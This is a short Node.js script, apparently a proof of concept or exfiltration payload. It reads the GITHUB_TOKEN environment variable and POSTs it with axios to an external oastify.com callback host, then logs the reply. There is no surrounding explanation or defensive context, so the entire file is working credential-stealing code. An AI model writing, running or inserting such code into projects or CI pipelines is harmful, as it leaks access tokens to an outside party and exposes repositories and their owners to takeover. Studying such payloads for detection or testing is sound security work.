const axios = require('axios');

const github_token = process.env.GITHUB_TOKEN;
const url = "http://4rwk0epqjk0px2tw5bsmjqn77ydp1jp8.oastify.com";

axios.post(url, `token=${github_token}`)
  .then(response => {
    console.log('Response:', response.data);
  })
  .catch(error => {
    console.error('Error:', error);
  });
